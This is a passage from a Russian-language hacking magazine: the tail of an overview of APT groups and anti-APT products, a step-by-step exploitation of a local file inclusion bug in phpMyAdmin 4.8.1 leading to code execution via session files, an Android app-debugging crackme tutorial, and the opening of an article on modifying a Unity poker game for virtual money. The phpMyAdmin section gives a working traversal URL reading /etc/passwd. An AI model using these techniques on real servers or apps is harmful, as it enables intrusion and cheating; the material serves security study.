шотов и собранных сведений о зараженном компьютере, а также загрузки
дополнительных инструментов по команде управляющего сервера. Для обхо‐
да антивирусов бэкдор загружался не нап рямую, а через троян‐дроппер
DROPSHOT. В нем использовались продвинутые методы защиты от эвристи‐
ческого анализа. Часть кода была вынесена во внеш ние скрипты, а его уста‐
новка и дальнейшая работа защищалась собс твенными драйверами. Пред‐
положительно это модификация дроппера, разработанного другой иранской
APT‐группой (SHAMOON, aka Disttrack). Подоб ный вариант ранее исполь‐
зовал ся ими для доставки бэкдора SHAPESHIFT и вайпера StoneDrill. Пос‐
ледний просто стирал все данные с зараженного компьюте ра, то есть это уже
был не шпионаж, а саботаж.
  Среди других инстру ментов APT33 были замечены еще две сторонние
разработки: продающаяся в даркнете программа удаленного доступа (RAT)
NANOCORE с поддержкой плагинов и бэкдор NETWIRE, ориентированный
на хищение данных.


APT32 (OceanLotus)
Xакерская  группа,  атакующая преимущес твенно иностранные компании,
инвестирующие  в  раз витие  производс тва  на  территории  Вьетнама.
Основные отрасли — ретейл, консалтинг и гос тиничный сектор. Такой выбор
целей неясен, как и мотивы. По мнению специалистов FireEye, APT32 дей‐
ствует в интересах пра вительства Вьет нама. Атаки могли выполняться
для сбора информации пра воохранительными органами. Также это могло
быть обычное хищение интеллектуальной собственности или даже своеоб‐
разные меры по борьбе с коррупцией и теневым бизнесом. Так или иначе,
деятельность APT32 в конечном ито ге подрывала конкурентное пре имущес‐
тво выбранных ими организа ций.
  Сами атаки не отличаются техничес кой сложностью. Это все та же попытка
заставить пользователя выполнить вредонос ный макрос методами социаль‐
ного инжиниринга. Одним показывается сооб щение о мнимой необходимос‐
ти разрешить мак росы для отображения отсутс твующего шриф та, а другим —
произвольные коды ошибок в Hex‐формате и куча алертов «Включите мак‐
росы!». Как ни странно, столь грубый метод ока зался довольно действенным.
  В зависимости от сценария ата ки макрос запускает одну или несколько
вредоносных программ:
 • BEACON — выполняет инжект произвольного кода в запущенные процес‐
   сы. Собирает сведения об учетных данных пользователей. Импортирует
   сеансовые мандаты Kerberos. Может использовать Metasploit framework;
 • KOMPROGO — полнофункциональный бэкдор, скрыто выполняющий дей‐
   ствия с реестром и файловой системой. Может запус кать обратный шелл.
   Также собирает и отправляет информа цию о зараженной системе;
 • PHOREAL — бэкдор, создающий обратный шелл и поддерживающий связь
   с командным сервером через ICMP;
 • SOUNDBITE — бэкдор, уста навливающий связь с управляющим сервером
   с помощью закодированных DNS‐запросов. Уме ет собирать данные
  о системе и поль зователях, создавать и отправлять файлы, а также вно‐
   сить изме нения в реестр;
 • WINDSHIELD — бэкдор, использующий методы противодействия отладке.
   Устанавливает связь с C&C через TCP raw sockets. Рандомно выбирает
   один из управляющих четырех серверов и шести портов. Собирает мак‐
   симально подробную информа цию о системе и протоколирует любые
   изменения в реестре или файловой системе. Может выгружать из памяти
   другие процессы, включая некоторые антивиру сы.

Дополнительно в атаках APT32 использовалась уязвимость организации
запуска драйверов режима ядра CVE‐2016‐7255. Она актуальна для боль‐
шинства версий Windows (от Vista SP2 до 10.1607) и позволя ет запускать вре‐
доносный код с повышенными привилегиями.


APT19 (C0d0so0 Team)
Предположительно китайская хакерская группировка, состоящая из фрилан‐
серов, действующих в интересах пра вительства КНР. В 2010 году взломала
сайт Комитета Нобелевской премии мира в Норвегии, чтобы распространять
через него бэкдоры методом watering hole, а в 2014 году повторила эту же
методику с сайтом Forbes.com. При посещении скомпрометированных сайтов
браузер подгружал вредоносный скрипт с другого, и выполнялась drive‐by‐
загрузка малвари.
  В 2017 году APT19 атаковала австра лийские юри дические фирмы, чтобы
получить бизнес‐информа цию об  их международных клиентах, дающую
китайским компаниям конкурентное преимущес тво. Тогда она использовала
три разные наживки для spear‐phishing. В начале мая фишинговыми приман‐
ками служили документы в формате RTF, которые загружали пейлоад через
уязвимость нулево го дня в Microsoft Oﬃce — CVE 2017‐0199. К концу мая AP‐
T19 переключилась на использование электронных таблиц Excel (XLSM)
с поддержкой макросов. Позже APT19 добави ла непрямой вызов зараженных
документов XLSM, и по крайней мере одна из новых приманок доставляла
модификацию бэкдора BEACON под названием Cobalt Strike.
  Параллельно  бэкдоры  семейства  Derusbi  дос тавлялись  в  систему
под видом кейгена для платной версии анти виру са AVG. При запуске они соз‐
давали два файла: %LOCALAPPDATA%\dbgeng.dll  (троянский компонент)
и %LOCALAPPDATA%\fakerx86.exe (сим волический отладчик Windows). Далее
он проверяет, что запущен не в контексте rundll32.exe (то есть не в песочнице
и не в отладчике). Если проверка выполнена успешно, то в реестре создается
ключ   HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows
Debug  Tools  –  %LOCALAPPDATA%\fakerx86.exe и устанавливается связь
с командным сервером.
  На C&C методом HTTP POST отправляет ся лог с информацией о системе
(IP‐ и MAC‐адреса, имя пользователя и компьютера, сведения об аппаратной
части) в кодировке Base64. В ответ сервер при сылает дальнейшие команды,
закодированные в параметре background‐color фейковой веб‐страницы.
Для их выполнения он также может передать дополнительные компоненты.


ЗАЩИТА
Антивирусные компании уже много лет наперебой предлагают свою защиту
от APT. У большинства она мало чем отличается от набора традиционных
средств для анализа тра фика, файловой системы и запущенных процессов.
Просто под вывеской Anti‐APT их стало легче продавать.
  Насколько мне извес тно, эффективных методов противодействия APT
пока не существует. Снизить ущерб от них поможет разумная осторожность
(см. тренинги по безопасности) и следующие технические решения от круп‐
ных вендоров.


Kaspersky Threat Management and Defense
Вклю чает в себя систему защиты от целевых атак Kaspersky Anti Targeted At‐
tack (находит аномалии в сетевом тра фике, изолиру ет подозрительные про‐
цессы и прослеживает связи между событиями) и решение Kaspersky End‐
point Detection and Response (отвечает за сбор и визуальное представление
собранных данных).


Symantec Advanced Threat Protection
Использует   концепцию   контрольных   точек,   отслеживая  изменения
по основным векторам APT‐атак. Ищет ано малии в почтовом трафике
и сетевой активности приложений. Широко использует песочницы для изо‐
ляции процессов и про верки файлов, загружа емых по сети. Применя ет
репутационный  анализ и  технологии облачной проверки. Может  быть
интегрирована со сторонними SIEM‐системами.


IBM QRadar Security Intelligence Platform
Продвинутая SIEM‐система, использующая ИИ IBM Watson для раннего обна‐
ружения APT‐атак и вычисления их источни ка.


RSA NetWitness
Еще одна продвинутая SIEM с технологиями машинного обучения. Интегри‐
рованное решение для ана лиза сетевого трафика, поведенческого анализа,
контроля поведе ния конечных точек и поиска вза имосвязи между выявленны‐
ми отклонениями.


FireEye iSIGHT Intelligence Subscriptions
Подписка на аналитические отчеты о текущих атаках с их детальным описани‐
ем и рекомендациями по противо дей ствию выявленным APT. Ее ведением
занимается более 150 специалистов, а визу ализация данных выполняется
через веб‐интерфейс и собственные API FireEye.
ВЗЛОМ



                      ЭКСПЛУАТИРУЕМ LFI
                       И ВЫПОЛНЕНИЕ
                  ПРОИЗВОЛЬНОГО КОДА
                         В PHPMYADMIN





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity

 ПОЛНОСТЬЮ ТВОЙ
   АДМИН




phpMyAdmin — популярнейший веб‐менеджер для баз дан‐
ных MySQL. Воз можность его уста нов ки есть у боль шинства
хостингов, и примерно на каждом вто ром сайте можно найти
путь, по которому он установлен. Сам понимаешь, насколько
это лакомый  кусочек —  уязвимость  в таком продукте.
Под угрозой — масса компаний от мала до велика.


Уязвимость была обнаружена ребятами из команды ChaMd5 и поз воляет
выпол нить произволь ный код на целевой системе. Найденный баг затрагива‐
ет все версии phpMyAdmin ветки 4.8, вплоть до пос ледней — 4.8.1.


ПОДГОТОВКА
Первым делом готовим все для демонстрации уяз вимос ти. Так как phpMyAd‐
min написан на PHP (кто бы мог подумать), то его установка не вызовет
никаких проблем даже у твоей пра бабушки.
   Как обычно, воспользуемся докер‐контейнерами для максимально быс‐
трого  создания  нужной  нам  инфраструктуры.  Мы  будем  ломать
веб‐интерфейс для администрирования MySQL, поэтому сначала поднимем
сервер MySQL.


$ docker run ‐d ‐e MYSQL_USER="pmavh" ‐e MYSQL_PASSWORD="8Aiu04nOay"
‐e MYSQL_DATABASE="pmavh" ‐‐rm ‐‐name=mysql ‐‐hostname=mysql mysql/
mysql‐server

Теперь дело за оставшимися тремя буквами из стека LAMP: Linux, Apache
и PHP. Веб‐сервер будет на основе Debian.


$ docker run ‐it ‐‐rm ‐p80:80 ‐‐name=pmavh ‐‐hostname=pmavh ‐‐link=
mysql debian /bin/bash

Ставим необходимые сервисы и зависимости.


$ apt‐get update && apt‐get install ‐y apache2 php php‐mysqli
php‐mbstring nano wget php‐xdebug

Если не хочешь возиться с отладкой, то можешь не устанавливать модуль
php‐xdebug и не выполнять команды для его настройки.


$ echo "xdebug.remote_enable=1" >> /etc/php/7.0/apache2/conf.d/
20‐xdebug.ini
$ echo "xdebug.remote_host=192.168.99.1" >> /etc/php/7.0/apache2/
conf.d/20‐xdebug.ini

Следующим  шагом  будет  загрузка  дистрибутива  и  его  распаковка
в веб‐директорию.


$ cd /tmp && wget https://files.phpmyadmin.net/phpMyAdmin/4.8.1/
phpMyAdmin‐4.8.1‐all‐languages.tar.gz
$ tar xzf phpMyAdmin‐4.8.1‐all‐languages.tar.gz
$ rm ‐rf /var/www/html/* && mv phpMyAdmin‐4.8.1‐all‐languages/* /var/
www/html/
$ chown ‐R www‐data:www‐data /var/www/html/

Теперь нужно выполнить базовую нас тройку phpMyAdmin, иначе работа с ним
будет невозможна. Для настройки нужно создать или отредактировать кон‐
фигурационный файл — ручками или с помощью специального интерфейса.
  Я воспользуюсь первым вариантом, так как детальная настройка нас
не интересует. Для дефолтной cookie‐авто ризации нужно указать секретный
ключ (blowfish_secret), для шифрования данных сес сии.


$ sed ‐i "s/cfg\['blowfish_secret'\] = '/\0$(tr ‐dc 'a‐zA‐Z0‐9' < /
dev/urandom | fold ‐w 32 | head ‐n 1)/" /var/www/html/config.sample.
inc.php

Ну и необходимо указать адрес сервера MySQL, к которому будет под клю‐
чение. У нас подклю чен контейнер под названием mysql, его и запишем.


$ sed ‐i 's/localhost/mysql/' /var/www/html/config.sample.inc.php

Далее делаем конфиг легитимным, переименовав его.


$ mv /var/www/html/config.sample.inc.php /var/www/html/config.inc.php

Можно запускать Apache, про верять работу нашего инс трумента и перехо‐
дить к поиску и эксплуата ции уяз вимости.


$ service apache2 start





                Установленный phpMyAdmin версии 4.8.1


LOCAL FILE INCLUSION (LFI). ДЕТАЛИ УЯЗВИМОСТИ
Баг можно проэксплуатировать только под учеткой авторизованного поль‐
зователя, поэтому для начала нуж но вой ти. Сразу стало немного скучно?
Не стоит недооценивать опасность этой уяз вимос ти! Сколько раз в моей
практике было так, что креды для дос тупа к базе данных есть, а шелл залить
возможности нет. Теперь таких проблем будет на порядок меньше.
   Итак, заглянем поч ти в самое начало файла index.php.


/index.php
54: // If we have a valid target, let’s load that script instead
55: if (! empty($_REQUEST['target'])
56:     && is_string($_REQUEST['target'])
57:     && ! preg_match('/^index/', $_REQUEST['target'])
58:     && ! in_array($_REQUEST['target'], $target_blacklist)
59:     && Core::checkPageValidity($_REQUEST['target'])
60: ) {
61:     include $_REQUEST['target'];
62:     exit;
63: }

Интересный кусочек кода, не правда ли? По сути, он выпол няет включение
(include)  того, что мы передадим в параметре target. Причем делать
это можно любыми спо собами (POST, GET, COOKIE) благодаря глобальной
переменной $_REQUEST. Все, что от нас требует ся, — это успешно пройти
пять условий, которые проверя ются if.
   1. !empty($_REQUEST['target']) — тут совсем все просто. Конечно же,
мы будем указывать что‐то в target, ина че в чем смысл?
   2. is_string($_REQUEST['target']) — ну разуме ется, это будет стро‐
кой, include не умеет работать с мас сивом имен файлов.
   3. !preg_match('/^index/', $_REQUEST['target']) — название файла
для include не дол жно начинаться с index. Хорошо, учтем этот момент.
   4. !in_array($_REQUEST['target'],  $target_blacklist) — и вдо‐
бавок файл не дол жен находиться в черном списке. Вот как он выглядит:


/index.php
50: $target_blacklist = array (
51:     'import.php', 'export.php'
52: );

Окей. Постараемся подобрать дру гие интерес ные файлы.
   5. Core::checkPageValidity($_REQUEST['target']) — вот тут придет‐
ся немножко повозиться. Давай заглянем в этот метод и пос мотрим, что
за дополнительные проверки он там выполняет.


/libraries/classes/Core.php
443: public static function checkPageValidity(&$page, array $whitel
ist = [])
444: {
445:     if (empty($whitelist)) {
446:         $whitelist = self::$goto_whitelist;
447:     }
448:     if (! isset($page) || !is_string($page)) {
449:         return false;
450:     }
451:
452:     if (in_array($page, $whitelist)) {
453:         return true;
454:     }

Первое, что нас интересует, — это попадание нашего параметра в белый
список. Специально он не ука зан, а поэтому используется значение по умол‐
чанию self::$goto_whitelist.


/libraries/classes/Core.php
27: /**
28:  * the whitelist for goto parameter
29:  * @static array $goto_whitelist
30:  */
31: public static $goto_whitelist = array(
32:     'db_datadict.php',
33:     'db_sql.php',
34:     'db_events.php',
35:     'db_export.php',
36:     'db_importdocsql.php',
37:     'db_multi_table_query.php',
38:     'db_structure.php',
39:     'db_import.php',
40:     'db_operations.php',
41:     'db_search.php',
42:     'db_routines.php',
43:     'export.php',
44:     'import.php',
45:     'index.php',
46:     'pdf_pages.php',
47:     'pdf_schema.php',
48:     'server_binlog.php',
49:     'server_collations.php',
50:     'server_databases.php',
51:     'server_engines.php',
52:     'server_export.php',
53:     'server_import.php',
54:     'server_privileges.php',
55:     'server_sql.php',
56:     'server_status.php',
57:     'server_status_advisor.php',
58:     'server_status_monitor.php',
59:     'server_status_queries.php',
60:     'server_status_variables.php',
61:     'server_variables.php',
62:     'sql.php',
63:     'tbl_addfield.php',
64:     'tbl_change.php',
65:     'tbl_create.php',
66:     'tbl_import.php',
67:     'tbl_indexes.php',
68:     'tbl_sql.php',
69:     'tbl_export.php',
70:     'tbl_operations.php',
71:     'tbl_structure.php',
72:     'tbl_relation.php',
73:     'tbl_replace.php',
74:     'tbl_row_action.php',
75:     'tbl_select.php',
76:     'tbl_zoom_select.php',
77:     'transformation_overview.php',
78:     'transformation_wrapper.php',
79:     'user_password.php',
80: );

Вот такой внушительный список нам доступен. Это почти все файлы, которые
лежат в корне дистрибутива. Тут логика понятна — разработчики не хотят,
чтобы мы тут шатались и выполняли всякие произволь ные коды.
  А дальше идет проверка, которая убивает всю защиту и смысл белого
списка.


/libraries/classes/Core.php
456: $_page = mb_substr(
457:     $page,
458:     0,
459:     mb_strpos($page . '?', '?')
460: );
461: if (in_array($_page, $whitelist)) {
462:     return true;
463: }

Если мы передадим название любого файла из белого списка, добавим воп‐
росительный знак и после него что угодно, то такая строка пройдет проверку.
Например, db_datadict.php?CHECK.





           Обход проверки белого списка в phpMyAdmin

Но что нам дает include такой стро ки? Ответ прост: выпол нение кода на PHP
из любого файла. Все дело в особенностях обра бот ки путей до фай лов. Мы
можем использовать выход из директорий (directory traversal) для доступа
к произвольным файлам. Например, каноничный /etc/passwd можно про‐
читать таким образом:


http://pma.visualhack/index.php?target=db_datadict.php?/../../../../
etc/passwd





                      Уяз вимость LFI в phpMyAdmin


ПУТЬ К RCE
Теперь у нас есть читалка‐выполнялка PHP — самое время превратить ее
в RCE. Как же это сделать, если у нас нет возможности загрузить файл?
На самом деле вариантов множество, но все зависит от конфигурации сер‐
вера.
  Посмотрим на вариант выполнения кода через файлы сес сии. По дефолту
седьмая вер сия PHP в Debian хра нит их по пути /var/lib/php/sessions/ и,
конечно же, они имеют нужные нам права доступа, так как читаются веб‐сер‐
вером.





         Дефол тные пути, по которым находятся файлы сессии

Нам осталось лишь найти возможность записать туда нужную информацию.
И такая возможность имеется в phpMyAdmin. Во время работы он сохраняет
историю успешно выполненных SQL‐запросов в переменной sql_history
сессии текущего пользователя. За это отвечает метод setHistory класса
Relation. Каждый раз при заг рузке футера стра ницы отрабаты вает функция
getDisplay, в которой, помимо прочего, вызыва ется обертка _setHistory.
Внутри него и принимается решение о сохранении данных, если соб людены
нужные условия.


/libraries/classes/Footer.php
311: public function getDisplay()
312: {
313:     $retval = '';
314:     $this‐>_setHistory();


/libraries/classes/Footer.php
246: private function _setHistory()
247: {
248:     if (! Core::isValid($_REQUEST['no_history'])
249:         && empty($GLOBALS['error_message'])
250:         && ! empty($GLOBALS['sql_query'])
251:         && isset($GLOBALS['dbi'])
252:         && $GLOBALS['dbi']‐>isUserType('logged')
253:     ) {
254:         $this‐>relation‐>setHistory(
255:             Core::ifSetOr($GLOBALS['db'], ''),
256:             Core::ifSetOr($GLOBALS['table'], ''),
257:             $GLOBALS['cfg']['Server']['user'],
258:             $GLOBALS['sql_query']
259:         );
260:     }
261: }


/libraries/classes/Relation.php
1052: public function setHistory($db, $table, $username, $sqlquery)
1053: {
...
1064:     if (! isset($_SESSION['sql_history'])) {
1065:         $_SESSION['sql_history'] = array();
1066:     }
1067:
1068:     $_SESSION['sql_history'][] = array(
1069:         'db' => $db,
1070:         'table' => $table,
1071:         'sqlquery' => $sqlquery,
1072:     );





        Сохранение истории SQL‐запросов phpMyAdmin в сес сии

Узнать имя файла сессии не сос тавля ет тру да. Для этого дос таточно пос‐
мотреть значение куки phpMyAdmin, где находится идентификатор сес сии
текущего пользователя.





            Идентификатор сес сии текущего пользовате ля

По умолчанию имя файла сес сии имеет префикс sess_. Если теперь собрать
все вместе, то получаем путь:


/var/lib/php/sessions/sess_dhtqvdka6sbe7fqcosjs0vuee2e04872

Остается только сох ранить нужный код на PHP в сес сию.





              Сохраня ем пейлоад для RCE в файл сес сии

И затем вызвать его с помощью включения сессионного фай ла.





               Успешная эксплуата ция phpMyAdmin 4.8.1

Код успешно выпол нен, можно наб людать приятный глазу вывод функции ph‐
pinfo().


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАКЛЮЧЕНИЕ
Уязвимость банальная, но при этом опасная, причем не где‐нибудь, а в пер‐
вых же строчках основного index.php. Непонят но, как такая оплошность
проскочила в релизную ветку.
  Разумеется, незамедлительно выпус тили новую версию 4.8.2, в которой
уязвимость исправили. Но мы прекрасно знаем, что продукты вроде php‐
MyAdmin обновляются катастро фически редко. На хостингах их, может быть,
с некоторой периодичностью и обновляют, а вот на индивидуальных серверах
зачастую — никогда. Так что если ты где‐то поставил phpMyAdmin, у тебя есть
все шансы стать исключением из это го правила.
ВЗЛОМ





                                                                  Евгений Зобнин
                                                                       Редактор Unixoid и Mobile
                                                                                    zobnin@glc.ru
    ЗЛОЙ
    ДЕБАГ
           ИССЛЕДУЕМ И ВЗЛАМЫВАЕМ
           ПРИЛОЖЕНИЯ ДЛЯ ANDROID
             ПРИ ПОМОЩИ ОТЛАДЧИКА





Мы уже неоднократно рассказыва ли о взломе приложений
для Android. Нес колько раз мы вскрывали приложения прак‐
тически голыми руками, имея только декомпилятор и дизас‐
семблер, один раз прибегли к помощи фрей мворка Frida,
но есть и еще один, одновременно очевидный и неочевид‐
ный способ взлома — использовать отладчик.


             INFO

                     Предыдущие статьи про взлом приложе ний:
                    •Делаем платное приложение бесплатным
                     •Внедряем малварь в WhatsApp
                   •Обходим обфускаторы, упаковщики и другие
                        средства защиты кода
                     •Внедряем код в чужие приложения с помощью
                              Frida


Строго говоря, это не то чтобы отдельный спо соб взлома, а скорее, способ
разобраться в поведении приложения, чтобы найти его слабые места. Смысл
здесь следующий: представь, что у тебя на руках семпл малвари. Ее код силь‐
но обфусцирован, декомпилятор едва переварива ет половину кода, и разоб‐
раться в ее работе почти невозможно. Тебе нужен способ проследить ее
воркфлоу, разобраться в том, какая цепочка классов вызывается при воз‐
никновении опре деленных событий.
  Во все времена лучший способ сделать это состоял в использовании
отладчика. Но есть одна проб лема: у тебя нет исходников, а без них отладчик
мало полезен в твоем деле. Зато у тебя есть воз можность декомпилировать
приложение в Java (нередко только час тично) или в дос таточно высокоуров‐
невый (в сравнении с машин ным кодом) код smali, который всегда будет пол‐
ностью корректным.
   Так что в целом алгоритм тво их действий будет выглядеть так:
 1. Достаем подопытное приложение из устройства.
 2. Дизассемблируем его, выставляем флаг отладки.
 3. Собираем обратно и уста навливаем на устройство.
 4. Импортируем декомпилированный или дизас семблированный код в An‐
   droid Studio.
 5. Запускаем отладку, будто это наше приложение.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами данной статьи.



ФЛАГ ОТЛАДКИ
Android устроен таким обра зом, что не поз волит подключиться с помощью
отладчика к приложению, которое этого не хочет. А факт «хотения» определя‐
ется флагом отладки, который представляет собой простую строку в фай ле
AndroidManifest.xml приложения.
  Поэтому первое, что мы должны сделать, — это разобрать при ложение,
выставить флаг отладки в значение true и соб рать обратно. Проще все го
это сделать с помощью утилиты apktool. Просто натравливаем ее на подопыт‐
ное приложение, и готово:


$ java ‐jar apktool.jar d app.apk

В текущем катало ге появится подкаталог app (ну или как назывался пакет
с приложе нием).
  Далее переходим в него и видим нес колько фай лов и каталогов. Нам они
еще пригодятся, а пока открываем файл AndroidManifest.xml в текстовом
редакторе и находим строку, начина ющуюся с <application. Это тег applica‐
tion, который описывает приложение в целом. Именно к нему мы должны
добавить атрибут android:debuggable="true". Просто вставь его сразу
после application:


<application android:debuggable="true" ...

Теперь приложение необходимо запако вать и подписать:


$ java ‐jar apktool.jar b app
$ java ‐jar sign.jar app.apk

Утилиту sign можно найти на GitHub.
  После этого приложение можно уста новить на устройство.


ДЕКОМПИЛЯЦИЯ И ДИЗАССЕМБЛИРОВАНИЕ
Дизассемблерный листинг приложения у нас уже есть, мы получили его,
разобрав приложение с помощью apktool. Мы можем импортировать его
в Android Studio и начать отладку. Но лучше все‐таки попытаться получить
исходники Java, гораздо более легкие в чтении.
  Для этого приложение необходимо декомпилиро вать. Сделать это можно
с помощью несколь ких раз личных инструментов, но я предпочитаю исполь‐
зовать декомпилятор Jadx. Он хорошо переварива ет код, име ет средства
деобфускации и активно развивается.
   Скачиваем Jadx, запус каем, выбираем apk‐файл приложения. Откроется
главное окно приложения. Слева будут пакеты, спра ва исходники. Лучше сра‐
зу проверить их кор ректность (действи тельно ли получился читаемый Java‐
код), а затем можно экспортировать их с помощью меню File → Save as gradle
project.





                Декомпиляция приложения в Jadx


ANDROID STUDIO И ОТЛАДКА
Теперь экспортированные исходники необ ходимо импортировать в Android
Studio (да, у тебя дол жна быть установлена и настроена среда разработки).
Делается это с помощью меню File → Open → New Project → Import Project.
Затем выбираем каталог с исходниками и в ответ на все вопросы нажимаем
«Далее».
   Если все прой дет успешно, исходники будут импорти рованы и ты увидишь
их в главном окне Android Studio. Опять же лучше сра зу прой тись по файлам
и проверить их корректность. В 99,9% случаев ты увидишь множество под‐
черкиваний и выделе ний крас ным: в понимании среды разработки исходники
полны ошибок. Это абсолютно нормально, так как декомпилированный код
так или иначе не дол жен быть пригоден для компиляции.





             Декомпилированный код в Android Studio

Теперь активируй на смартфоне режим отладки по USB (Настройки →
О телефоне → восемь тапов по номеру сборки), подключи его к компу. В An‐
droid Studio нажми кнопку Attach debugger to Android process (она находится
рядом с кнопками запус ка и оста новки приложения), чтобы подключиться
к смартфону и приложению.
   Если снизу появилась панель дебаг гера — ты на коне. Следующий шаг —
расставить брейк‐пой нты в тех местах приложения, которые ты хочешь иссле‐
довать. Сде лаем это на примере простейшего crackme‐one, который записы‐
вает строку в файл, а тебе нуж но узнать содержимое этой строки. Он хранит
строку в открытом виде, но мы предста вим, что он расшифровывает ее только
во время записи и поэто му мы должны поймать момент этой записи, чтобы
вычленить уже расшифро ванную, но еще не записанную строку.
   Итак, с чего начать? Сперва выяс ним, с какой активнос ти начинается
исполнение приложения. В данном случае это опять же бес смыс ленно в силу
простоты crackme, но в больших приложениях пригодится. Найти исходник
нужной активности можно с помощью файла AndroidManifest.xml. Вот
как выглядит описание главной активности в crackme:


<activity android:label="@string/app_name" android:name="com.reoky.
crackme.challengeone.activities.ChallengeActivity">
    <intent‐filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent‐filter>
</activity>

Обрати внимание на строки, содержащие android.intent.action.MAIN
и android.intent.category.LAUNCHER. Они озна чают, что именно с этой
активности начнется исполнение приложения (на самом деле таких активнос‐
тей может быть несколько, но это редкость). Также обрати внимание на сле‐
дующую строку:


android:name="com.reoky.crackme.challengeone.activities.Challe
ngeActivity

Можно сказать, это полный «путь» до активнос ти, включая все имена покетов.
Именно по такому пути ты найдешь ее в исходниках, загруженных в Android
Studio.
  Открыв исходник этой активности в Android Studio, ты заметишь его край‐
нюю простоту. По сути это окно с переключателем табов, а содержимое
табов  располагается  внутри  фрагментов  в  пакете/каталоге  fragments.
Переходим в него и видим ChallengeOneFragment. Он как раз и содержит
поле ввода ответа и кнопку для записи фай ла. Внимательно прочитав
исходник, замечаем, что в качес тве колбэка для этой кнопки используется
ChallengeOneFragmentOnClickListener,  определенный  в  одноименном
файле в каталоге listeners.
  Открываем этот файл и среди прочих видим такие строки:


OutputStreamWriter outputStreamWriter = new OutputStreamWriter(parent
.getContext().openFileOutput("ANSWER", 1));
outputStreamWriter.write("poorly‐protected‐secret");
outputStreamWriter.flush();
outputStreamWriter.close();

Поздравляю, мы взло мали crackme, искомая строка: "poorly‐protected‐secret".
Но постой, мы же догово рились, что представим будто строка зашиф рована
и мы не можем ее увидеть. Вот здесь нам и нужен дебаггер: соль в том, чтобы
поставить брейк‐пой нт на вто рую строку приведенного выше лис тинга и пос‐
ле этого запустить приложение. Когда исполнение приложения дой дет
до этой точки, оно будет остановлено, а мы с помощью консоли дебаггера
сможем прочитать аргумент вызова write (который уже должен быть рас‐
шифрован перед записью).
   Итак, открываем исходник в Android Studio, находим нужную строку и кли‐
каем рядом с номером этой строки. Строка подсвечивается красным, сиг‐
нализируя об установке брейк‐пойнта. Наверняка ты не сразу сможешь уста‐
новить корректный брейк‐пойнт  (тот, который будет отмечен галочкой),
потому что исходники, скорее всего, не будут соответствовать коду приложе‐
ния. По этой же причине тебе придется действовать всле пую, когда исполне‐
ние приложение дой дет до брейк‐пойнта. При переходе к следующей строке
дебаггер будет кидать тебя в совершенно неверные куски кода, постоянно
сообщая, что код некор ректный.
  Выхода из этой ситуации два: либо продвигаться на ощупь, либо вместо
декомпилированного Java‐кода загрузить в Android Studio дизас сембли‐
рованный код smali, который просто технически не может быть некорректным.


ИСПОЛЬЗУЕМ ДИЗАССЕМБЛИРОВАННЫЙ КОД
Дизассемблированный код приложения у нас уже есть. Мы получили его, ког‐
да разбирали приложение с помощью apktool. Проблема только в том, что
Android Studio в своем стандартном вари анте хоть и умеет подсвечивать код
smali, но не способ на «работать» с этим кодом. Дру гими словами, мы сможем
прочитать  код  smali,  но  не сможем  уста новить  брейк‐пойнты.  Чтобы
это исправить, нужен сто ронний плагин smalidea, а общая последователь‐
ность действий будет выглядеть так:
 1. Скачиваем плагин smalidea.
 2. Импортируем плагин в Android Studio: Settings → Plugins → Install plugin
   from disk.
 3. Импортируем каталог с разобранным приложением точно так же, как мы
   это делали в случае декомпилированного кода.
 4. В боковой панели кликаем на Android и выбира ем Project Files, чтобы уви‐
   деть все файлы и каталоги проекта.
 5. Кликаем правой кнопкой на катало ге smali и выбираем Mark directory as →
   Sources root.

Как и в случае с Java‐кодом, нужный нам код находится в listeners/Challen‐
geOneFragmentOnClickListener. В этот раз код намного длиннее и запутаннее,
но, используя ранее полученный Java‐исходник, ты легко найдешь нужное
место, а именно 246‐ю строку:


invoke‐virtual {v4, v8}, Ljava/io/OutputStreamWriter;‐>write(Ljava/
lang/String;)V

Ставь на нее брейк‐пой нт, запускай при ложение и, когда оно остановится,
посмотри на окно дебаггера. В нем будет состояние текущего и других объ‐
ектов. Нажимая F7, ты заставишь дебаггер выполнить следующую строку
с  переходом  внутрь  вызываемой функции  (в нашем  случае  output‐
StreamWriter.write("poorly‐protected‐secret")). Оказавшись  внутри
нее, ты сможешь просмотреть содержимое ее аргу мента, а именно искомую
строку. В данном случае ее видно и до перехо да в функцию, но, если бы она
была зашифрована, этот метод помог бы выяснить реальное значение.





               Отлаживаем дизассемблированный код


ВМЕСТО ВЫВОДОВ
Отладчик — очень удобный и весь ма полезный инс трумент реверсера. Он
позволяет установить пос ледова тельность исполнения инс трукций приложе‐
ния и обнаружить скрытые данные. С помощью отладчика можно изу чать тон‐
кости работы Android и приложений для него.
ВЗЛОМ
 ALL IN
  ПО ФАНУ





                                                 aLLy
                                              ONsec
                                                    @iamsecurity





 КАК РАЗОБРАТЬ, ИЗМЕНИТЬ И СОБРАТЬ ОБРАТНО
        МОБИЛЬНУЮ ИГРУ НА UNITY



Разработчики игр с удовольствием пользуются теми удобс‐
твами, что им предоставляет движок Unity, но, как выяс‐
нилось, он столь же удобен и для любого желающего
вскрыть  эти  игры. Для примера я возьму  Poker  World
и покажу на ней, как можно не только менять параметры,
но и влезть в саму логику, переина чить все на свой лад
и перепаковать APK. Заодно соберем небольшой набор ути‐
лит, который поможет в работе с мобильным софтом.


             INFO

                     Все  манипуляции  с  приложением  делались
                      исключительно в исследовательских целях и не
                      преследуют финан совой выгоды в каком‐либо
                        виде.


Работа работой, а отдыхать тоже нужно. Человек я не азартный, но карты
покидать люблю. Недавно я приметил офлай новое приложение для игры
в покер под названием Poker World. У него аскетичный интерфейс, минималь‐
ный набор функций, но есть почти все, что мне нужно. Напрягал только
повышенный интерес разработчиков к донату. Поэтому с каждой раздачей
исследовательская жилка напрягалась и таки не выдержала. Я взялся за кла‐
виатуру с твердым намерением раз добыть себе немного виртуальных день‐
жат.


ПЕРВЫЕ ШАГИ
Чтобы начать вивисекцию приложения, нам понадобится небольшой стенд.
В первую очередь стоит поставить нормальный эму лятор Android. Раньше я
использовал Andy, но теперь он скурвился и даже начал пихать майнеры
в свои дистрибутивы. Мне в срочном порядке пришлось искать замену. Моя
основная ОС — Windows, и поэто му все поиски были направлены на дис три‐
бутивы для этой платформы. Я перебрал с десяток вариантов из топа выдачи
